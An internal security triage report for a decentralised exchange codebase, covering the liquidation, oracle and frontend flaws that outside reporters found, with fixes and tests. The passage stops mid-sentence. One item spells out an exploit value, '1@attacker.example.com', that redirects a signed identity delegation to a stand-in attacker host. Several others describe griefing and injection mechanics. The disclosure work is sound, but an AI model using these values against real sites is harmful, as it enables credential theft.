# Community issue triage — August 2026

Triage of the eleven reports filed on `dfinity/public-multidex` (issues #2–#12) by two
outside teams — OhShii Labs (`rvnt9999`, #4–#11) and the Menese DeFi Team
(`KYounesMercatura`, #2, #3, #12) — between 2026-08-01 and 2026-08-02. **Every claim was re-verified against the
tree at `2fbbe86` by symbol lookup, not by trusting the reporters' line numbers** (the public
mirror is a single squashed snapshot, `0241cba`, so citations drift). Verdicts and the
evidence behind them are the basis for the points in [CONTRIBUTORS.md](../CONTRIBUTORS.md).

**Headline: of ~40 distinct findings, essentially all were confirmed.** Four sub-claims were
refuted, all of them supporting prose rather than core findings. Two teams working
independently converged on the liquidation and oracle paths, which is itself signal.

> **FIX STATUS (2026-08-02): §0, §1 and §2 are implemented, plus the §3 documentation
> corrections and §4.1–§4.2.** Every fix is pinned by a test that fails on the pre-fix tree —
> `tests/test_audit_2026_08_fixes.sh` (11 backend assertions), `tests/frontend_security.test.mjs`
> (53), `tests/test_deploy_hygiene.sh` (53, mutation-tested against 13 reintroduced bugs),
> `tests/test_archive_chain_paged.sh`, and additions to `tests/Liquidator.test.mo`,
> `tests/PriceFeed.test.mo` (~100 assertions), `tests/OrderBook.test.mo` and
> `tests/MatchingEngine.test.mo`. What is **not** done is listed in §6.
>
> **Correction (2026-08-03):** this line previously read "and all of §4". §4.3 (the uncapped
> sweeps — `sweepStaleUserOrders` has no per-call cap, and `tickTier`'s uptime and
> volume-badge walks are unsharded) has **no** code change and no test. §4.1 and §4.2 are
> closed. See §7 for the second wave of reports, which re-derived §4.3 independently.

Verification also surfaced **three defects nobody reported** (§4) and **one finding whose
severity is higher than the reporter knew** (§1, dust griefing).

A **second wave of reports (#13–#21) landed on 2026-08-02**, after this triage was written,
from a third reviewer (`andreij6`). They are triaged in §7, not above — several are explicit
corrections to conclusions recorded here.

> **REFRESH (2026-08-15) — read §8 first if you are deduplicating.** Rounds 2–6
> (#22–#28, #36–#41) were triaged into a 54-task queue and worked to completion;
> §8 below carries the per-issue status table (fixed / open / decision, with what
> changed). Corrections to THIS document's own stale claims are edited in place
> and marked "(corrected 2026-08-15)": §1.7 (heartbeat isolation was half-done,
> now done), §2's `settleNettedPair` clearance (wrong — fixed as #15.2), the six
> §3 items 1.60 fixed, and §6's deferred list (all four closed). Reporters' own
> retractions are recorded in §8.4.

---

## 0. Fix this first: there is no private disclosure channel

`SECURITY.md:7` points reporters at `https://github.com/dfinity/multidex/security/advisories/new`.
That repository is **private** (confirmed via the GitHub API: `private=true`); the public mirror
is `dfinity/public-multidex`. The link 404s for every external reporter.

Consequences already realised:

- All eleven reports landed **publicly**, including working exploit mechanics.
- OhShii Labs is **withholding a user-targeting delegation-phishing exploit** (§1.2) explicitly
  because there is nowhere private to send it. They have asked for a channel.

This is a one-line fix and it is blocking a real report. Do it before anything else.

---

## 1. Fix now — live, user- or fund-affecting

### 1.1 The in-browser ledger verifier has never verified anything
`src/frontend/src/ledger.js:139-147` passes a bare `Principal` where the SDK dispatches on
`{ canisterId }`. It throws on **every** call, in every environment; the throw is swallowed at
`:153-158` into `{ok: null}`; `verify()` still paints `lg-ok` and "✓ N links verified".
`index.html:2012` claims "nothing is taken on the exchange's word". A hostile replica can serve
a fabricated tape with `certificate = []` and the page ticks green.

The identical bug was already diagnosed and fixed in `scripts/verify_ledger.mjs:430-435`, with
the reasoning written out in a comment.

**Sequencing constraint (found in verification, not reported):** `main.js:975-978` calls
`fetchRootKey()` unconditionally with no hostname guard, so on mainnet the root key comes from
the host being verified. Today that has no consumer *because* the certificate check always
throws. **Fixing the certificate check alone promotes the root-key bug from latent to a live
"certificate VALID" bypass.** The two must land together. The CLI's guard
(`verify_ledger.mjs:59-64`, exact hostname match) is the pattern to port.

Credit: OhShii #4.3 + #4.4.

### 1.2 `ai-connect.html` mints an unrestricted, mis-displayed II delegation
All four structural claims confirmed, and verification **independently derived a working
exploit primitive** the reporters withheld:

- `:61-63` concatenates an unvalidated `port` fragment param into the callback URL. A value of
  `1@attacker.example.com` yields `http://127.0.0.1:1@attacker.example.com/callback`, which by
  URL authority syntax resolves to the attacker's host. `:134-138` then **POSTs the signed II
  delegation there**.
- `:62` sends `ttl_ns` to II while `:68` *displays* a different param, `ttl_hours` — the consent
  shown need not match the delegation minted.
- `:109-113` requests **no `targets`**, so the delegation is valid for every canister.
- `:104` guards the inbound postMessage origin; nothing validates the outbound destination. The
  page's CSP is `frame-ancestors 'none'` only, with no `connect-src`.

**Not capped by `#play`.** This targets users, not the protocol; an II delegation is the user's
real identity credential and is unscoped here. Their decision to withhold was correct.

Credit: OhShii #11.4.

### 1.3 One dust payment makes a short pool permanently un-liquidatable
`pickCollateral` prefers ICPUSD unconditionally on `balance > 0` with no value floor; the
derived repay floors to zero; `writeOffLoan` rejects zero; the driver does `break L` instead of
trying the next collateral. The pool's real collateral is never examined, on every 30s sweep,
forever. `absorbBadDebt` never runs, so `getMarginRiskSummary` shows a solvent book.

**Worse than reported, three ways** (the third found while writing the fix):
1. Not "exactly one base unit" — **any** dust below the debt token's whole-unit price triggers
   it. The real window is **~$0.00168**, double the first estimate, because the derived repay
   floors *twice* (once converting to debt units, once applying the penalty multiplier).
2. `pickCollateral`'s **same-token first pass** has the identical unconditional-balance defect —
   a second independent route to the same trap, which the report treated as a bounded ≤1-unit leak.
3. **It is self-inflicting: no dust payment and no attacker are required.** The cross-token seize
   refunds a remainder (`retainedColl` rounds up), and that refund is itself sub-threshold dust.
   Measured on the pre-fix code: a pool holding $10,000 ICPUSD + $200,000 SOL has its ICPUSD
   seized first, creating a 160,000-unit residue below the 168,000 threshold; the next iteration
   picks that residue, floors to zero, and breaks — leaving **all 1000 SOL untouched** and
   returning `#insolvent`. So `absorbBadDebt` fires and socialises a loss to the insurance fund
   against a **fully-collateralised** position. That is worse than "un-liquidatable", and it
   raises the trigger from "someone sends dust" to "any partial close whose seize is
   balance-capped".

Credit: OhShii #6.1 (refinements 1–3 found during verification and fix).

### 1.4 The post-fill liquidation hook has no freshness guard
`adjustAffectedUsers` calls `tryLiquidate` with no `userMarksFreshAt` check, while both batch
call sites have one, and `tryLiquidate` performs none of its own — `marginPriceLookup` returns
a frozen `refPrice` of any age. The breaker *manufactures* the stale window: a pended jump
deliberately withholds `refPriceUpdatedNs`.

`tryLiquidate`'s own comment is self-incriminating: *"Safe to call on any user... so callers
(post-fill hook, timer scan) don't need a pre-check."* Put the guard **inside** `tryLiquidate`
so no future call site can miss it.

Credit: OhShii #6.2.

### 1.5 A short cannot be closed in the 1.15–1.25 health band
`clampToInitialMargin` scores a fill on instantaneous LTV-weighted collateral delta and ignores
the debt repayment the fill triggers. Verification's algebra: `headroom` is **independent of
trade size** and is `≤ 0` exactly when health `≤ 1.25`, so `#partial` becomes unreachable and
every realistic close price is killed. Users are forced into the 5% liquidation penalty a
permitted close would have avoided. Two other sites assert the opposite invariant
("you must always be able to de-lever"; "closing is always allowed"). `gateInitialMargin` has
the escape clause the clamp lacks.

Credit: OhShii #6.3.

### 1.6 `runLiquidationBatch` is unbounded on a fund-safety path
Three phases, no cap, no cursor, no shard, no budget. `adminRunLiquidationBatch` calls the same
function, so a controller cannot recover past the threshold. `absorbBadDebt` has exactly one
call site, reachable only through `tryLiquidate`, so the risk panel stays green either way.

**Open question, load-bearing for the failure signature — settle this on a replica.** Menese
measured a *silent* failure (stamps advance, work never completes), which requires
`ignore tickLiquidations()` to schedule a separate message. Two verification agents read the
source the other way (no `await` in the body ⇒ runs inline ⇒ the whole heartbeat traps).
Evidence favours **separate message**: `tickLiquidations` is declared plain `async`; moc 1.9.0
refuses the call without send capability (`M0047`), which an inline computation would not need;
and Motoko provides `async*`/`await*` precisely as the non-message-sending alternative.

**The remediation is identical either way** — shard with `lib/Shard.mo`, stamp `_lastLiqNs` on
*completion* rather than dispatch, add a consecutive-failure breaker. Only the symptom differs
(silent vs. whole-heartbeat stall). Cheap decisive test: force a trap inside `tickLiquidations`
locally and watch whether `_lastHeartbeatNs` advances.

Credit: Menese #12.1.

### 1.7 A trap in any synchronous heartbeat subtask stops maintenance permanently
**(corrected 2026-08-15: FIXED — and the earlier "implemented" claim was half-true.)** The
1.60 fix isolated only the `ignore tickX()` async dispatches; the nine inline subtasks named
below still ran unisolated, which round 3 called out. As of 2026-08-15 every heartbeat
subtask runs through `hbRun` (an async self-send isolating each task's trap) behind `hbReady`
(a per-subtask dispatch/completion breaker with geometric backoff, capped 32×) — pinned by
`tests/test_heartbeat_isolation.sh`. Original finding, kept for the record:
Confirmed unisolated: `reapClosedOrders`, `drainLedgerJournal` (unthrottled, every beat),
`tickTier`, `tickHeatmaps`, `tickLeaderboardShard`, `settleInsuranceArrears` (unthrottled),
`tickCandleFill`, `tickDeadman` (unthrottled), `sweepStaleUserOrders`. All four aggravating
properties verified, including the self-reinforcing journal (`Accounts.mo:45` is the sole write
funnel; `List.clear` is only reachable after the full loop) and cadence alignment (every `HB_*`
constant divides 300s evenly). No consecutive-failure breaker existed anywhere at that time.

Good catch worth noting: `sweepStaleUserOrders` is declared `: Nat`, not `async`, so its
textual `ignore` defers nothing — the reporters classified it correctly *despite* the
misleading syntax.

Credit: OhShii #5.7.

### 1.8 A free identity can write unbounded permanent state
- `setUserPreferences` — no cap on the array, the strings, or anything else; never cleared by
  `performWorldWipe`; no admin purge. Reachable **before** any anti-Sybil control applies.
- `createMarginPool(name)` — name stored raw, no length check; 64 pools/principal × unlimited
  identities; each call also creates a `poolByPrincipal` entry and a `MarginEngine.open`
  account; and **there is no close/delete path anywhere**, despite the cap message telling users
  to close a pool.
- `_internet_identity_sign_in_start` — ungated, unthrottled, and each call costs the canister a
  management-canister `raw_rand` while costing the caller nothing.

The blanket fix the reporters suggest is good: Motoko's `inspect` accepts `arg : Blob`, so one
size check closes every oversized-payload variant at once.

Credit: OhShii #5.1, #5.3, #5.5.

---

## 2. Fix soon — integrity, fairness and value leaks

| # | Finding | Credit |
|---|---|---|
| 2.1 | **Our own 31 Jul fix created an asymmetry.** `e66a27e` added the virtual offset to `stakeInsurance` only; `unstakeInsurance` has never been touched since genesis, so `redeem(mint(A)) > A` whenever share value > 1.0 — the normal state. Verification reproduced **+104,165 base units** exactly. | Menese #3.1 |
| 2.2 | `stakeInsurance`'s mint denominator omits `insuranceOwedUsd`, a receivable already earned by existing stakers. **Distinct root cause from 2.1** — fixing either alone leaves the other open. | OhShii #7.2 |
| 2.3 | Vault NAV haircuts `insuranceOwedUsd` but `withdrawLp` pays from gross holdings, flipping the sign of the safe loan-book asymmetry. The comment defending that asymmetry never mentions the arrears term. | OhShii #7.1 |
| 2.4 | `vaultPricesStale` tests a leg's **value** (`balance × price`) not its **balance**, so a leg priced at 0 is skipped by the guard while being marked at $0 in NAV. `createAmmPool` overwrites an existing pool with `refPrice = 0` unconditionally — plausibly an honest reconfiguration mistake. | OhShii #7.3 |
| 2.5 | Volume credit reaches the scorecard on **exactly one** settlement path. AMM-sweep fills, both cross-swap legs, and the expiry fallback never credit it — so honest makers filled by the AMM sweep earn nothing, and the under-counted exchange volume pins the level scale at its floor, which is what makes buying rank 2 cost ~$15. | OhShii #6.5 |
| 2.6 | `STAGED_CAP_PER_OWNER` keys on the raw principal while pools stage under **pool** principals, giving one account 65 × 32 = 2,080 slots — above `SHED_SOFT_STAGED`, so one account can raise the floor that excludes everyone else. | OhShii #6.6 |
| 2.7 | `mmQuoteStamp`/`mmOwnerStamp` are written at staging and cleared nowhere except `resetExchange`, so a staged-then-cancelled post-only order buys a free, renewable, market-agnostic L4 shield. Already listed as an unshipped guardrail in `docs/market-maker-program.md`. | OhShii #6.4 |
| 2.8 | The 2.5% breaker has no absolute anchor, and **XRC is unwired on every `#play` deploy** (`play_start.sh:131-134` runs `setXrcCanister "(null)"` — broader than the docs' cloud-engine framing), so there is no anchor *and* no alarm. `xrcSources` is written and never read. | OhShii #9.1 |
| 2.9 | `geptorFetchAndSweep` has no single-flight guard and `applyFreshAggregate` stamps continuation time, so a stale sample can overwrite a fresher one **and be stamped brand new** — defeating every gate keyed on `refPriceUpdatedNs` at once. `tickShipEvents` holds the only `finally` in 15k lines. | OhShii #9.2 |
| 2.10 | The archive's L2 shed fires on **queue depth alone** while its own comment says "if shipping is broken *and* the queue hit the cap". `_shipFailStreak` is maintained and consulted by the L1 roll on the very next line. ~21 minutes of backlog, or any stop/upgrade window that long, permanently destroys 50,000 events. **No adversary required.** | OhShii #9.4 |
| 2.11 | `verifyChain` reseeds `prev = null` per call, leaving one link per page unverified while returning `ok = true` — in the paged-audit flow its own docstring recommends. | Menese #3.2 |
| 2.12 | `trimOutliers` returns untrimmed below 3 samples while `PRICE_MIN_SOURCES = 2`. Real protection at n≥3 is the median's breakdown point, not the trim — which makes the n=2 case worse, not better. Bounded in practice by a 50 bps dispersion gate the reporters missed. | Menese #3.3 |
| 2.13 | `parseLeadingFloat` silently truncates scientific notation; `findAfter` is first-occurrence **by construction**, so every extractor is fragile, not just the three named. Latent for today's plain-decimal feeds. | Menese #3.4 |
| 2.14 | `processDeferredExpiry` releases an uncapped same-instant cohort through an O(K²) matcher. The codebase already shards for exactly this reason elsewhere. | Menese #2.1 |
| 2.15 | Bridge `claim` writes a permanent ledger row for an unvalidated asset **before** rejecting; the Bridge has no posture concept at all — and the same stub is wired into both production-facing deploy targets. | OhShii #5.2 |

---

## 3. Documentation and readiness

Docs asserting protections the code does not deliver — fix the text, or the code, but not
neither:

- **(fixed in 1.60)** `getApiDoc()` and `docs.js` both claim other users' rows are filtered server-side / "never
  leave the canister". `archiveExecute` deliberately serves every other user's deposits and
  withdrawals. Under the transparency doctrine the *publicness* is defensible; the claims are
  not. `main.mo` already contradicts itself on this ~600 lines below, and
  `tests/test_archive_replay.sh` depends on the behaviour the docs deny. (OhShii #8.1)
- **(fixed in 1.60)** The owner gate on `getEventsForPrincipals` says it "closes the targeted vector", but
  `getEventsRange`/`getDepositWithdrawals` are public and every row carries `user` **and**
  `counterparty`. Doc-only would concede the gate is decorative. (OhShii #8.2)
- **(fixed — §11 now opens "TARGET STATE, NOT CURRENT STATE")** `bridge-and-cks-design.md` §11 stated NNS sole-controllership in the **present tense**;
  the live posture is a single operator principal. (OhShii #10.6d)
- **(fixed 2026-08-15, W6-02)** The kill matrix referenced `claimPlayFunds` and `tests/test_play_claim.sh`. The method is
  retired, `PLAY_BASKET` is gone, and **the test file does not exist** — yet
  `pre-mainnet-checklist.md:49` lists it as a required verification step. (OhShii #10.6c)

Code-side privacy gaps that don't conflict with the doctrine: the `capitalUsd` join
(OhShii #8.3), `order.id` de-anonymising partially-filled resting orders (#8.4a), and the
`_nameEntropySeeded` latch with no `postupgrade` — a shape `src/bridge/main.mo` already
documents and fixes (#8.4b).

Production-readiness **(all four below fixed: interlocks + arb gate verified live 2026-08-15;
clean-checkout build fixed by W5-06; module-hash/reproducible-build verification remains open)**:
three unbacked-credit endpoints lacked the `IS_PRODUCTION` interlock every
sibling has, and `extMarketSwap` is reachable by a **non-controller** (OhShii #7.4);
`setTestEmailBinding` was gated on `IS_PRODUCTION` instead of `IS_DEV` (now requireController +
dev-gated), and the rebind escape
hatch its comment promises **does not exist as a method** (#10.6a); `injectHistoricalTrades`
had no posture gate (#10.6b — now controller + genesis-window gated, decision 2026-08-06); no build verification, module-hash check, or reproducible build,
and `npm install` rather than `npm ci` (#10.4).

Operator-machine-only, but real: the `awk` program-text injection on the mainnet deploy path —
and because `/tmp` is sticky, a file planted by another local user **cannot** be removed or
overwritten by our own `rm -f`, so this is a persistent plant rather than a race (#10.1);
`cold_start.sh` pattern-killed (**fixed** — the deploy-path scripts now carry zero live
pkill/pgrep-by-pattern, enforced by `test_deploy_hygiene.sh` §3; the fourth-fleet-kill comment
survives as history) (#10.2); the keychain helper pre-authorises unsigned binaries against the
controller identity (#10.3); `deploy_to_engine.sh` passed a target `deploy.sh` didn't
recognise (**fixed** — unknown targets now hard-error and `cloud`/`engine` is a canonical
alias) (#10.5).

---

## 4. Found during verification — not reported by anyone

1. **`lint-ratchet.sh`'s type-check gate cannot fail.** Step 1 omits the project's real build
   flags, so its output fills with spurious `M0057` noise, and its detector is
   `grep -qE ': error'` — but Motoko always emits `": type error [Mxxxx]"`, never a bare
   `": error"`. It matches neither real errors nor the noise and prints `✓ type-check: ok`
   unconditionally. Confirmed directly: `lint-ratchet.sh` exits **PASS** in the same tree where
   `mops test` reports **14/15 files passing, 1 failing**. Menese's suggested fix (widen the
   glob) is therefore *incomplete* — `tests/` is never fed to the idl step, and the M0155 grep
   would ignore an M0151 anyway. This needs a real per-file type-check with a working pattern.
   **The same missing flags had silently disabled a second gate**: the M0155 "hard zero"
   ratchet reported 0 because moc aborted on M0057 before the analysis ran. With the flags
   restored it immediately found **two real unguarded subtractions that had been in the tree
   the whole time** (`main.mo` liq-price and slippage-impact paths, both now `SafeMath.subOrZero`).
   So the repaired gate paid for itself on its first run.
2. **`openOrdersByUser` grows forever.** `OrderBook.mo`'s `removeFromOpenIndexes` never prunes
   the outer `userKey` entry when a user's order set empties — unlike the price-level pruning
   three lines above, which does. Every principal who has *ever* placed an order stays in the
   map, and it feeds the uncapped `sweepStaleUserOrders` sweep.
3. **A second and third uncapped sweep.** Menese's "every other sweep is bounded" is wrong in a
   direction that flatters us: `sweepStaleUserOrders` has no cap (they misattributed
   `EVICT_MAX_PER_CALL`, which belongs to `evictOverCap` on the placement path), and `tickTier`
   is only *partially* sharded — only its join-badge backfill uses `Shard.step`, while the
   quoter/uptime sampling, a five-map level recompute, and lifetime-volume badge checks are
   full scans every tick.
4. ~~**The integration suite runs against a replica the bot fleet is actively trading on.**~~
   **FIXED 2026-08-05, in this change set.** The finding was real: `deploy.sh local` →
   `cold_start.sh` started local bots on *every* deploy and they kept trading while the suite
   asserted exact balances and zero-order-book invariants, so a large share of its failures were
   noise. `run_all.sh`'s guard could not stop them — the old `pkill -f simulate_trading.sh`
   never matched the real process name (`trading_simulation.sh`). Measured at the time: stopping
   the local supervisor by PID turned four of eight re-run failures green with no code change.

   The remedy was already half-built and unused. `scripts/lib/bots.sh` (committed in `868090f`)
   records `.run/bots-<target>.pid` on every start and stops a fleet by **ancestry** from that
   pid — `mdx_kill_tree` walks `pgrep -P` and never matches on a name — but `cold_start.sh` and
   `run_all.sh` were still pattern-killing beside it. This pass routes both through the
   wrappers: `cold_start.sh` calls `stop_bots_local.sh` then `start_bots_local.sh`, so every
   fleet it starts is recorded. `play_start.sh` already did. Verified live with three fleets
   running concurrently (local, engine, subnet): each `.run/bots-*.pid` matched its supervisor
   exactly, and the local stopper touched only the local tree.

   **`run_all.sh`'s half was inert until 2026-08-05, and this is the §7 pattern again.** The
   guard was rewritten to call the stopper, so it read as repaired — but it resolved the path as
   `$(dirname "$0")/../scripts/stop_bots_local.sh` while line 27 had already `cd`-ed into
   `tests/`. `$0` is the invocation path, not the resolved one, so from the repo root the test
   became `tests/tests/../scripts/…`, which does not exist; the `if` had no `else`, so the guard
   silently did nothing. It worked when run from inside `tests/` and no-oped when run from the
   repo root — which is how it is actually invoked. Caught by running the suite with the fleet
   deliberately up and watching all 12 bots survive a run that claimed to have stopped them:
   **20 red, against a baseline of 4.** Now resolved through the absolute `SCRIPT_DIR` computed
   at the top of the file, gated on `-f` rather than `-x` (the stopper is invoked as
   `bash <path>`, which needs no executable bit, so `-x` let a `chmod` disable the guard), and
   with an `else` that says the fleet was not stopped instead of staying quiet.

   The general lesson is the one #18 and #21 already charged us for: **a guard that fails
   silently is worse than no guard**, because the suite still prints a total and that total gets
   believed. Both halves of this one — the path and the `-x` — failed closed-mouthed.

   Two properties worth keeping. The stopper **does not fall back to a pattern search** when the
   pid file is absent; it reports the unrecorded processes and stops, because guessing is what
   killed the live subnet fleet three times. And `run_all.sh:100-115` prints any fleet tagged
   `MDX_TARGET=` that it cannot account for, so an externally-started fleet is visible in the
   suite's own output rather than silently skewing it.

---

## 5. What the reporters got wrong

Recorded for scoring, and because it calibrates how much to trust the rest.

| Claim | Reality |
|---|---|
| "`mktemp` appears exactly once in the repo" (OhShii #10.1) | Also in `tests/run_all.sh` ×2, `tests/test_property_fuzz.sh`, `.claude/sync-ic-skills.sh` ×4. Their narrower "never in a deploy script" holds. |
| "the longest script on the deploy path" (#10.2) | `cold_start.sh` is third (448 lines vs `deploy.sh` 907, `seed.sh` 542), and two siblings share its weak `set` posture. |
| `withdraw` listed as an omitted **controller** capability (#10.6c) | It is a `requireAuth` user function, interlocked the opposite way (fails closed on `#production`). |
| "every other sweep in the codebase is bounded" (Menese #12) | Two counterexamples — see §4.3. |
| The `#3.3` n=3 contrast example (Menese) | `trimOutliers` doesn't exclude the outlier at n=3 either; the median's breakdown point does the work. Their conclusion still holds, their evidence doesn't. |
| A quoted in-code comment about staged cohorts (Menese #2.1) | Does not appear verbatim anywhere in the tree. The mechanism it describes is real. |
| `oracle-xrc-fallback-design.md` §3.4 "presents the breaker as bounding manipulation" (#9.1) | It's §3.3, and it is *more* candid than implied — it names the ratcheting risk explicitly, and §3.5 records that auto-halt was deliberately rejected for v1. |
| Vault worked example "+$112,392" (#7.3) | Their own formula gives $112,369.48. Immaterial; direction and magnitude correct. |

Both teams also flagged confidence honestly where they had not established a precondition
(OhShii on the vault arrears window; Menese on the `capitalUsd` join's uniqueness), and
verification could not close those either. That restraint is worth more than the errors cost.

---

## 6. Deliberately not done, and why

Recorded so the gaps are visible rather than assumed closed.

- **(DECISION RECORDED 2026-08-15, W4-21: the transparency doctrine wins — the verifier
  forces the join to stay; see §8)** **The `order.id` ↔ `fill.orderId` join is only half-closed.** `id` cannot be dropped from the
  `order` projection: it is that entity's declared primary key and `Executor.mo:649` traps on a
  hidden pk. The OQL half is already shut (the public `userEvent` projection carries no
  `orderId`), but the archive's raw `getEventsRange` still returns the whole `#fill` variant, so
  the join survives there. Closing it properly means per-kind redaction on the archive surface —
  a larger change than this pass, tracked in §3.
- ~~**The async-dispatch question in §1.6 is still open.**~~ **SETTLED 2026-08-04, by the
  compiler rather than the replica.** Moving the dispatch into a plain (non-`async`) helper made
  moc reject `ignore tickLiquidations()` with `M0047, send capability required, but not
  available`. Only a genuine message send needs that capability, so `tickLiquidations` schedules
  a **separate message**: a trap inside it rolls back that message alone and the heartbeat
  survives. Menese's *silent*-failure signature was the right one, and the two verification
  agents who read it as an inline computation were wrong. This is also why the failure had to be
  paced rather than merely counted — see §7.1.
- **(FIXED 2026-08-15, W4-18 — single-writer credit inside `updateStatsAfterTrades`, the
  hook every settling path already calls; `tests/test_volume_credit.sh` proves the swept-maker
  case; see §8)** **Volume-credit consolidation (§2.5) was not implemented.** The four bypassing paths are
  confirmed, but routing them all through one `creditTradeVolume` helper touches the settlement
  path in four places and deserves its own change with its own fee-conservation tests, rather
  than riding along with a security pass.
- **The Bridge posture gate went to `#production`, not `#dev` as first specified.**
  `devSimulateDeposit` turned out to be the live `#play` on-ramp (the frontend Deposit page calls
  it, and the play allowance flows through it), so a `#dev` gate would have deleted the only
  on-ramp the committed posture has. The genuine hole was the uncapped `#production` posture,
  where `playDepositCap()` returns null — that is what is now gated.
- **(FIXED 2026-08-15, W4-20 — live headers `curl -sD-`'d and recorded in
  `pre-mainnet-checklist.md`; `scripts/check_headers.sh` is now a post-deploy gate wired into
  deploy.sh; see §8)** **CSP was verified by configuration, not by response headers.** `security_policy: "standard"`
  is set on the shipping asset config and the build was audited for what `standard` would break
  (no `eval`, no WASM, no cross-origin fetches, no external fonts), but nothing has been
  `curl -sD-`'d against a deployed asset canister yet. Do that on the next remote deploy.
- **(FIXED 2026-08-15, W4-19 — the setter refuses below the floor; see §8)**
  **`_minSourcesOverride` could pin the source floor *below* the robustness floor.** It is
  dev-gated and today's only caller raises it, so nothing is broken — but the hook can defeat
  the n≥3 guarantee and should probably clamp.
- **The four red integration tests were baselined and are NOT caused by this change set.**
  A true `HEAD` baseline was obtained by building `HEAD` plus an inert stub of the one method
  this change set adds (`getLiquidationSweepHealth`, returning constants) — that makes the Candid
  interface match, so the downgrade installs. (A plain downgrade is refused twice over: the
  Candid gate rejects removing a method, and even past that the RTS refuses a
  memory-incompatible downgrade, because this change set adds stable vars. `--mode reinstall`
  is required.) Results on that baseline:
  `test_release_priority` **2 failed, identical assertions**; `test_orderbook_priority`
  **4 failed, identical**; `test_position_accounting` **1 failed, identical**. All three are
  pre-existing.
  `test_margin_heatmap` is a **venue-state artifact, not a code difference**: it never seeds and
  never waits, so it assumes a warm venue. Run against a wiped replica it fails 5; seeding the
  markets takes it to 2; the last two are `§8 history`, which only accumulates on the 30s
  `HB_HEAT_NS` tick. It passed on the baseline solely because earlier tests in that run had
  seeded the venue first. It should seed its own fixture or state its precondition.

> **One genuine regression was found this way and fixed.** The first cut of the
> `_nameEntropySeeded` fix keyed the retry on `_nameEntropy == 0`, which re-enters that branch on
> **every heartbeat** whenever the randomness beacon is unavailable — and the `await` inside it
> splits the heartbeat message, so everything after it (requotes, heatmaps, shipping) stops
> running. It silently killed `tickHeatmaps` on a local replica. The shipped fix is the one the
> reporters originally proposed: a `system func postupgrade()` that clears the latch, so the
> retry happens once per upgrade and the hot path keeps no `await` at all. This is a good
> argument for taking a reporter's suggested remedy seriously rather than improvising a cleverer one.

---

## 7. The second wave — issues #13–#21 (`andreij6`), filed 2026-08-02

Nine further reports landed *after* the triage above was written, from a third reviewer
working independently. Several are explicit corrections to conclusions recorded in §1–§6, and
they are right in every case checked so far. Verified against the working tree by symbol
lookup, same standard as above.

Two of them make a structural point worth stating plainly, because it applies to how the
first wave was fixed rather than to any single finding: **a sibling fix landing next to a
defect can disguise it.** #18 predicted exactly that for `verifyChain` — the inbound
page-boundary seed (#3.2) is fixed and now carries a coverage-auditing test, so the function
reads as repaired while it still never consults the certified `chainHead`. #21 makes the same
shape of point about §4.1's lint gate. Both were correct.

### 7.1 Fixed in this pass

- **#15 item 1 — seize-loop exhaustion misclassified as insolvency.** §1.3 fixed the dust
  trap and the missing rollback, but left the classifier reading only the resulting health.
  The loop has two terminal states that both leave a user liquidatable: every collateral
  walked and none could move the debt (genuinely insolvent), or the `MAX_SEIZE_ITERS` budget
  ran out mid-walk with seizable collateral standing. The second reaching `#insolvent` means
  `absorbBadDebt` writes off *every* remaining loan and socialises the residual — booking a
  fully-collateralised position as a loss. The bound is a message-size bound and carries no
  solvency meaning, so it is now recorded explicitly and the decision is a named pure
  function, `Liquidator.classifySeizingPass`. Budget exhaustion reports `#liquidated` (a
  partial close, which is what that variant already meant); the user stays in `loans` and the
  next sweep resumes from the improved health. Pinned by `tests/Liquidator.test.mo`: the
  classifier over all four terminal states, plus an invariant asserted across every
  liquidation shape in the file — `#insolvent` may only be returned when nothing seizable is
  left.

- **#17 item 1 — the outlier trim could not reject at n=3 or n=4.** The band was
  ±sigmaTrim·stddev of the whole set, outlier included, which is masking: at n=3 samples
  (a, a, b) the 2σ band is ±1.1547·d while the outlier sits at exactly d, and the relation is
  homogeneous in d, so a 0.1% outlier and a 100% outlier were both kept. At n=4 the band edge
  lands exactly on the outlier and the inclusive keep test admitted it. Rejection began at
  n=5, while a rate-limited source dropping in and out puts the fleet at 3–4 routinely — so
  one venue ~1% off the cluster inflated `stddevBps` past the caller's 50bps gate and froze
  the mark, the precise failure the trim exists to prevent.

  **The remedy proposed in §2.12 (and in issues #3.3/#9.1) does not fix this**, and OhShii
  Labs withdrew it in the #17 thread: raising `PRICE_MIN_SOURCES` to 3 moves the failure from
  "trim never runs" to "trim runs and mathematically cannot reject". That raise had already
  landed here, which is why this was worth catching. The band now uses the **MAD**
  (`PriceFeed.mad`), whose 50% breakdown point means no single reading can inflate it at any
  magnitude, scaled by 1.4826 and by a Croux-Rousseeuw finite-sample factor — without the
  latter the estimate runs ~50% low at n=3, and over-trimming is not a harmless direction
  here, since every rejected sample costs a source against the `MIN_ROBUST_SOURCES` floor.
  A band-width floor of `TRIM_BAND_FLOOR_BPS` (50bps, the caller's own dispersion tolerance)
  handles MAD's implosion when more than half the samples share a value, which is the
  ordinary case, not a contrived one. `aggregate` already measured dispersion on the surviving
  cluster, so the second half of the reporter's fix needed no change once the trim worked.

  Two consequences recorded because they are behaviour changes, not just bug fixes. At n=4
  the mark no longer freezes on a lone ~1% outlier: the trim removes it and the surviving
  three clear the gate. At n=3 it still does not move — but now because rejecting a sample
  leaves only two survivors, which is below `MIN_ROBUST_SOURCES`, rather than because a
  masked outlier blew the dispersion gate. Same outcome, honest reason, and consistent with
  the module's existing rule that a mark may HOLD on two sources but not MOVE. The
  2026-07-12 live-incident regression (7 sources, one 1.5% high) still trims exactly one and
  still clears the gate at ~14bps.

- **#20 — six frontend money-scaling and display-integrity defects.** See §7.3.

- **#12's consecutive-failure breaker (the third of the three specified remediations).** The
  slice and the stamp-on-completion landed in the first pass; the breaker did not, and only
  observability counters were added. That gap was worse than a no-op. Because `_lastLiqNs` is
  now stamped **only** on completion — correct, since it is the health signal — a trapping batch
  freezes it, so the heartbeat's `now - _lastLiqNs >= HB_LIQ_NS` predicate stayed true forever
  and re-dispatched on **every beat** instead of every 30s: an unthrottled retry of a message
  guaranteed to trap, billing for the instructions it burned before trapping each time. The
  partial fix therefore turned a 30s failure loop into a per-heartbeat one.

  Cadence now comes from a dispatch stamp, which advances whether or not the pass survives,
  while `_lastLiqNs` stays the completion-only health signal. `_liqFailStreak` counts dispatches
  still incomplete when the next fell due, and past `LIQ_FAIL_BREAK_THRESHOLD` (3, mirroring the
  archive's `SHIP_FAIL_ROLL_THRESHOLD`) retries back off geometrically to a 32-minute cap.
  Backoff rather than a hard halt is deliberate: halting a solvency engine needs an operator to
  notice, and if nobody does, liquidations never resume — backoff bounds the burn, keeps trying,
  and recovers by itself on the first completed pass, which is the only thing that clears the
